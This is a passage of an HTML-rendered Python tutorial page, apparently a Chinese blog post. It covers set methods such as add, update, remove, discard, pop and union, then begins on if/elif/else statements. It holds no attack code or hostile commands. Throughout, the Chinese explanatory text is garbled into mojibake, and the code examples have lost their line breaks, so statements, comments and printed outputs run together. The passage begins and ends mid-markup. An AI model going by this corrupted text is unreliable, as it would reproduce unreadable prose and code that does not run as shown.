ä¸­ä¸åŒæ—¶å­˜åœ¨çš„å…ƒç´ </span><span class="token triple-quoted-string string">'''{1, '123', 'test'}test åœ¨é›†åˆä¸­{'a', 'b', 'r', 'c', 'd'}{'b', 'd', 'r'}{'a', 'm', 'r', 'b', 'c', 'd', 'l', 'z'}{'c', 'a'}{'d', 'l', 'r', 'm', 'z', 'b'}'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ¨å¯¼å¼</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> <span class="token punctuation">{</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token string">'abracadabra'</span> <span class="token keyword">if</span> x <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token string">'abc'</span><span class="token punctuation">}</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token comment"># {'r', 'd'}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="åŸºæœ¬æ“ä½œ"><a href="#åŸºæœ¬æ“ä½œ" class="headerlink" title="åŸºæœ¬æ“ä½œ"></a>åŸºæœ¬æ“ä½œ</h3><h4 id="æ·»åŠ å…ƒç´ "><a href="#æ·»åŠ å…ƒç´ " class="headerlink" title="æ·»åŠ å…ƒç´ "></a>æ·»åŠ å…ƒç´ </h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> x <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">thisset <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"Google"</span><span class="token punctuation">,</span> <span class="token string">"Runoob"</span><span class="token punctuation">,</span> <span class="token string">"Taobao"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>thisset<span class="token punctuation">)</span>thisset<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>thisset<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''{'Taobao', 'Google', 'Runoob'}{'Taobao', 'test', 'Google', 'Runoob'}'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>s.update( x )å‚æ•°å¯ä»¥æ˜¯åˆ—è¡¨ï¼Œå…ƒç»„ï¼Œå­—å…¸</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s<span class="token punctuation">.</span>update<span class="token punctuation">(</span> x <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">thisset <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"Google"</span><span class="token punctuation">,</span> <span class="token string">"Runoob"</span><span class="token punctuation">,</span> <span class="token string">"Taobao"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>thisset<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>thisset<span class="token punctuation">)</span>thisset<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>thisset<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''{1, 3, 'Google', 'Taobao', 'Runoob'}{1, 3, 4, 'Google', 5, 6, 'Taobao', 'Runoob'}'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="ç§»é™¤å…ƒç´ "><a href="#ç§»é™¤å…ƒç´ " class="headerlink" title="ç§»é™¤å…ƒç´ "></a>ç§»é™¤å…ƒç´ </h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">s<span class="token punctuation">.</span>remove<span class="token punctuation">(</span> x <span class="token punctuation">)</span>thisset <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"Google"</span><span class="token punctuation">,</span> <span class="token string">"Runoob"</span><span class="token punctuation">,</span> <span class="token string">"Taobao"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>thisset<span class="token punctuation">)</span>thisset<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">"Taobao"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>thisset<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''{'Google', 'Taobao', 'Runoob'}{'Google', 'Runoob'}'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">s<span class="token punctuation">.</span>discard<span class="token punctuation">(</span> x <span class="token punctuation">)</span>thisset <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"Google"</span><span class="token punctuation">,</span> <span class="token string">"Runoob"</span><span class="token punctuation">,</span> <span class="token string">"Taobao"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>thisset<span class="token punctuation">)</span>thisset<span class="token punctuation">.</span>discard<span class="token punctuation">(</span><span class="token string">"Facebook"</span><span class="token punctuation">)</span>  <span class="token comment"># ä¸å­˜åœ¨ä¸ä¼šå‘ç”Ÿé”™è¯¯</span><span class="token keyword">print</span><span class="token punctuation">(</span>thisset<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''{'Google', 'Taobao', 'Runoob'}{'Google', 'Taobao', 'Runoob'}'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è®¾ç½®éšæœºåˆ é™¤é›†åˆä¸­çš„ä¸€ä¸ªå…ƒç´ </p><p>pop æ–¹æ³•ä¼šå¯¹é›†åˆè¿›è¡Œæ— åºçš„æ’åˆ—</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span> thisset <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"Google"</span><span class="token punctuation">,</span> <span class="token string">"Runoob"</span><span class="token punctuation">,</span> <span class="token string">"Taobao"</span><span class="token punctuation">,</span> <span class="token string">"Facebook"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token operator">=</span> thisset<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''Facebook'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="è®¡ç®—é›†åˆå…ƒç´ ä¸ªæ•°"><a href="#è®¡ç®—é›†åˆå…ƒç´ ä¸ªæ•°" class="headerlink" title="è®¡ç®—é›†åˆå…ƒç´ ä¸ªæ•°"></a>è®¡ç®—é›†åˆå…ƒç´ ä¸ªæ•°</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>thisset <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"Google"</span><span class="token punctuation">,</span> <span class="token string">"Runoob"</span><span class="token punctuation">,</span> <span class="token string">"Taobao"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>thisset<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="æ¸…ç©ºé›†åˆ"><a href="#æ¸…ç©ºé›†åˆ" class="headerlink" title="æ¸…ç©ºé›†åˆ"></a>æ¸…ç©ºé›†åˆ</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">s<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>thisset <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"Google"</span><span class="token punctuation">,</span> <span class="token string">"Runoob"</span><span class="token punctuation">,</span> <span class="token string">"Taobao"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>thisset<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>thisset<span class="token punctuation">)</span><span class="token comment"># set()</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="åˆ¤æ–­å…ƒç´ æ˜¯å¦åœ¨é›†åˆä¸­å­˜åœ¨"><a href="#åˆ¤æ–­å…ƒç´ æ˜¯å¦åœ¨é›†åˆä¸­å­˜åœ¨" class="headerlink" title="åˆ¤æ–­å…ƒç´ æ˜¯å¦åœ¨é›†åˆä¸­å­˜åœ¨"></a>åˆ¤æ–­å…ƒç´ æ˜¯å¦åœ¨é›†åˆä¸­å­˜åœ¨</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">x <span class="token keyword">in</span> sthisset <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"Google"</span><span class="token punctuation">,</span> <span class="token string">"Runoob"</span><span class="token punctuation">,</span> <span class="token string">"Taobao"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Runoob"</span> <span class="token keyword">in</span> thisset<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Facebook"</span> <span class="token keyword">in</span> thisset<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''TrueFalse'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ¤æ–­å…ƒç´  x æ˜¯å¦åœ¨é›†åˆ s ä¸­ï¼Œå­˜åœ¨è¿”å› Trueï¼Œä¸å­˜åœ¨è¿”å› False</p><table><thead><tr><th align="left">æ–¹æ³•</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-add.html">add()</a></td><td align="left">ä¸ºé›†åˆæ·»åŠ å…ƒç´ </td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-clear.html">clear()</a></td><td align="left">ç§»é™¤é›†åˆä¸­çš„æ‰€æœ‰å…ƒç´ </td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-copy.html">copy()</a></td><td align="left">æ‹·è´ä¸€ä¸ªé›†åˆ</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-difference.html">difference()</a></td><td align="left">è¿”å›å¤šä¸ªé›†åˆçš„å·®é›†</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-difference_update.html">difference_update()</a></td><td align="left">ç§»é™¤é›†åˆä¸­çš„å…ƒç´ ï¼Œè¯¥å…ƒç´ åœ¨æŒ‡å®šçš„é›†åˆä¹Ÿå­˜åœ¨ã€‚</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-discard.html">discard()</a></td><td align="left">åˆ é™¤é›†åˆä¸­æŒ‡å®šçš„å…ƒç´ </td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-intersection.html">intersection()</a></td><td align="left">è¿”å›é›†åˆçš„äº¤é›†</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-intersection_update.html">intersection_update()</a></td><td align="left">è¿”å›é›†åˆçš„äº¤é›†ã€‚</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-isdisjoint.html">isdisjoint()</a></td><td align="left">åˆ¤æ–­ä¸¤ä¸ªé›†åˆæ˜¯å¦åŒ…å«ç›¸åŒçš„å…ƒç´ ï¼Œå¦‚æœæ²¡æœ‰è¿”å› Trueï¼Œå¦åˆ™è¿”å› Falseã€‚</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-issubset.html">issubset()</a></td><td align="left">åˆ¤æ–­æŒ‡å®šé›†åˆæ˜¯å¦ä¸ºè¯¥æ–¹æ³•å‚æ•°é›†åˆçš„å­é›†ã€‚</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-issuperset.html">issuperset()</a></td><td align="left">åˆ¤æ–­è¯¥æ–¹æ³•çš„å‚æ•°é›†åˆæ˜¯å¦ä¸ºæŒ‡å®šé›†åˆçš„å­é›†</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-pop.html">pop()</a></td><td align="left">éšæœºç§»é™¤å…ƒç´ </td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-remove.html">remove()</a></td><td align="left">ç§»é™¤æŒ‡å®šå…ƒç´ </td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-symmetric_difference.html">symmetric_difference()</a></td><td align="left">è¿”å›ä¸¤ä¸ªé›†åˆä¸­ä¸é‡å¤çš„å…ƒç´ é›†åˆã€‚</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-symmetric_difference_update.html">symmetric_difference_update()</a></td><td align="left">ç§»é™¤å½“å‰é›†åˆä¸­åœ¨å¦å¤–ä¸€ä¸ªæŒ‡å®šé›†åˆç›¸åŒçš„å…ƒç´ ï¼Œå¹¶å°†å¦å¤–ä¸€ä¸ªæŒ‡å®šé›†åˆä¸­ä¸åŒçš„å…ƒç´ æ’å…¥åˆ°å½“å‰é›†åˆä¸­ã€‚</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-union.html">union()</a></td><td align="left">è¿”å›ä¸¤ä¸ªé›†åˆçš„å¹¶é›†</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-update.html">update()</a></td><td align="left">ç»™é›†åˆæ·»åŠ å…ƒç´ </td></tr></tbody></table><h3 id="å‡½æ•°ç¤ºä¾‹-4"><a href="#å‡½æ•°ç¤ºä¾‹-4" class="headerlink" title="å‡½æ•°ç¤ºä¾‹"></a>å‡½æ•°ç¤ºä¾‹</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">fruits <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"banana"</span><span class="token punctuation">,</span> <span class="token string">"cherry"</span><span class="token punctuation">}</span>fruits<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token string">"orange"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>fruits<span class="token punctuation">)</span><span class="token comment"># {'apple', 'cherry', 'banana', 'orange'}</span>fruits <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"banana"</span><span class="token punctuation">,</span> <span class="token string">"cherry"</span><span class="token punctuation">}</span>fruits<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>fruits<span class="token punctuation">)</span><span class="token comment"># set()</span>fruits <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"banana"</span><span class="token punctuation">,</span> <span class="token string">"cherry"</span><span class="token punctuation">}</span>x <span class="token operator">=</span> fruits<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token comment"># {'apple', 'cherry', 'banana'}</span>x <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"banana"</span><span class="token punctuation">,</span> <span class="token string">"cherry"</span><span class="token punctuation">}</span>y <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"google"</span><span class="token punctuation">,</span> <span class="token string">"microsoft"</span><span class="token punctuation">,</span> <span class="token string">"apple"</span><span class="token punctuation">}</span>z <span class="token operator">=</span> x<span class="token punctuation">.</span>difference<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>z<span class="token punctuation">)</span><span class="token comment"># {'cherry', 'banana'}</span>x <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"banana"</span><span class="token punctuation">,</span> <span class="token string">"cherry"</span><span class="token punctuation">}</span>y <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"google"</span><span class="token punctuation">,</span> <span class="token string">"microsoft"</span><span class="token punctuation">,</span> <span class="token string">"apple"</span><span class="token punctuation">}</span>x<span class="token punctuation">.</span>difference_update<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token comment"># {'cherry', 'banana'}</span>fruits <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"banana"</span><span class="token punctuation">,</span> <span class="token string">"cherry"</span><span class="token punctuation">}</span>fruits<span class="token punctuation">.</span>discard<span class="token punctuation">(</span><span class="token string">"banana"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>fruits<span class="token punctuation">)</span><span class="token comment"># {'apple', 'cherry'}</span>x <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"banana"</span><span class="token punctuation">,</span> <span class="token string">"cherry"</span><span class="token punctuation">}</span>y <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"google"</span><span class="token punctuation">,</span> <span class="token string">"runoob"</span><span class="token punctuation">,</span> <span class="token string">"apple"</span><span class="token punctuation">}</span>z <span class="token operator">=</span> x<span class="token punctuation">.</span>intersection<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>z<span class="token punctuation">)</span><span class="token comment"># {'apple'}</span>x <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"banana"</span><span class="token punctuation">,</span> <span class="token string">"cherry"</span><span class="token punctuation">}</span>  <span class="token comment"># y é›†åˆä¸åŒ…å« banana å’Œ cherryï¼Œè¢«ç§»é™¤</span>y <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"google"</span><span class="token punctuation">,</span> <span class="token string">"runoob"</span><span class="token punctuation">,</span> <span class="token string">"apple"</span><span class="token punctuation">}</span>x<span class="token punctuation">.</span>intersection_update<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token comment"># {'apple'}</span>x <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"banana"</span><span class="token punctuation">,</span> <span class="token string">"cherry"</span><span class="token punctuation">}</span>y <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"google"</span><span class="token punctuation">,</span> <span class="token string">"runoob"</span><span class="token punctuation">,</span> <span class="token string">"facebook"</span><span class="token punctuation">}</span>z <span class="token operator">=</span> x<span class="token punctuation">.</span>isdisjoint<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>z<span class="token punctuation">)</span><span class="token comment"># True</span>x <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">}</span>y <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"f"</span><span class="token punctuation">,</span> <span class="token string">"e"</span><span class="token punctuation">,</span> <span class="token string">"d"</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">}</span>z <span class="token operator">=</span> x<span class="token punctuation">.</span>issubset<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>z<span class="token punctuation">)</span><span class="token comment"># True</span>x <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"f"</span><span class="token punctuation">,</span> <span class="token string">"e"</span><span class="token punctuation">,</span> <span class="token string">"d"</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">}</span>y <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">}</span>z <span class="token operator">=</span> x<span class="token punctuation">.</span>issuperset<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>z<span class="token punctuation">)</span><span class="token comment"># True</span>fruits <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"banana"</span><span class="token punctuation">,</span> <span class="token string">"cherry"</span><span class="token punctuation">}</span>fruits<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>fruits<span class="token punctuation">)</span><span class="token comment"># {'cherry', 'banana'}</span>fruits <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"banana"</span><span class="token punctuation">,</span> <span class="token string">"cherry"</span><span class="token punctuation">}</span>fruits<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">"banana"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>fruits<span class="token punctuation">)</span><span class="token comment"># {'apple', 'cherry'}</span>x <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"banana"</span><span class="token punctuation">,</span> <span class="token string">"cherry"</span><span class="token punctuation">}</span>y <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"google"</span><span class="token punctuation">,</span> <span class="token string">"runoob"</span><span class="token punctuation">,</span> <span class="token string">"apple"</span><span class="token punctuation">}</span>z <span class="token operator">=</span> x<span class="token punctuation">.</span>symmetric_difference<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>z<span class="token punctuation">)</span><span class="token comment"># {'cherry', 'runoob', 'banana', 'google'}</span>x <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"banana"</span><span class="token punctuation">,</span> <span class="token string">"cherry"</span><span class="token punctuation">}</span>y <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"google"</span><span class="token punctuation">,</span> <span class="token string">"runoob"</span><span class="token punctuation">,</span> <span class="token string">"apple"</span><span class="token punctuation">}</span>x<span class="token punctuation">.</span>symmetric_difference_update<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token comment"># {'cherry', 'runoob', 'banana', 'google'}</span>x <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"banana"</span><span class="token punctuation">,</span> <span class="token string">"cherry"</span><span class="token punctuation">}</span>y <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"google"</span><span class="token punctuation">,</span> <span class="token string">"runoob"</span><span class="token punctuation">,</span> <span class="token string">"apple"</span><span class="token punctuation">}</span>z <span class="token operator">=</span> x<span class="token punctuation">.</span>union<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>z<span class="token punctuation">)</span><span class="token comment"># {'apple', 'cherry', 'banana', 'google', 'runoob'}</span>x <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"banana"</span><span class="token punctuation">,</span> <span class="token string">"cherry"</span><span class="token punctuation">}</span>y <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"google"</span><span class="token punctuation">,</span> <span class="token string">"runoob"</span><span class="token punctuation">,</span> <span class="token string">"apple"</span><span class="token punctuation">}</span>x<span class="token punctuation">.</span>update<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token comment"># {'apple', 'cherry', 'banana', 'google', 'runoob'}</span><span class="token triple-quoted-string string">'''{'orange', 'apple', 'cherry', 'banana'}set(){'apple', 'cherry', 'banana'}{'cherry', 'banana'}{'cherry', 'banana'}{'apple', 'cherry'}{'apple'}{'apple'}TrueTrueTrue{'cherry', 'banana'}{'apple', 'cherry'}{'cherry', 'banana', 'runoob', 'google'}{'cherry', 'google', 'banana', 'runoob'}{'cherry', 'banana', 'google', 'apple', 'runoob'}{'cherry', 'banana', 'google', 'apple', 'runoob'}'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="æ¡ä»¶æ§åˆ¶"><a href="#æ¡ä»¶æ§åˆ¶" class="headerlink" title="æ¡ä»¶æ§åˆ¶"></a>æ¡ä»¶æ§åˆ¶</h2><h3 id="ifè¯­å¥"><a href="#ifè¯­å¥" class="headerlink" title="ifè¯­å¥"></a>ifè¯­å¥</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> condition_1<span class="token punctuation">:</span>    statement_block_1<span class="token keyword">elif</span> condition_2<span class="token punctuation">:</span>    statement_block_2<span class="token keyword">else</span><span class="token punctuation">:</span>    statement_block_3    <span class="token triple-quoted-string string">'''å¦‚æœ "condition_1" ä¸º True å°†æ‰§è¡Œ "statement_block_1" å—è¯­å¥å¦‚æœ "condition_1" ä¸ºFalseï¼Œå°†åˆ¤æ–­ "condition_2"å¦‚æœ"condition_2" ä¸º True å°†æ‰§è¡Œ "statement_block_2" å—è¯­å¥å¦‚æœ "condition_2" ä¸ºFalseï¼Œå°†æ‰§è¡Œ"statement_block_3"å—è¯­å¥'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>pythonæ¯ä¸ªæ¡ä»¶åé¢éƒ½è¦ä½¿ç”¨å†’å·ï¼Œæ¥ç€æ˜¯æ‰§è¡Œè¯­å¥</li><li>ç¼©è¿›ç›¸åŒçš„ä½œä¸ºè¯­å¥å—ï¼Œç¼©è¿›ä¸ºä¸€ä¸ªtab</li><li>pythonä¸­æ²¡æœ‰switch-caseè¯­å¥</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">age <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"è¯·è¾“å…¥ä½ å®¶ç‹—ç‹—çš„å¹´é¾„: "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token keyword">if</span> age <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ä½ æ˜¯åœ¨é€—æˆ‘å§!"</span><span class="token punctuation">)</span><span class="token keyword">elif</span> age <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span 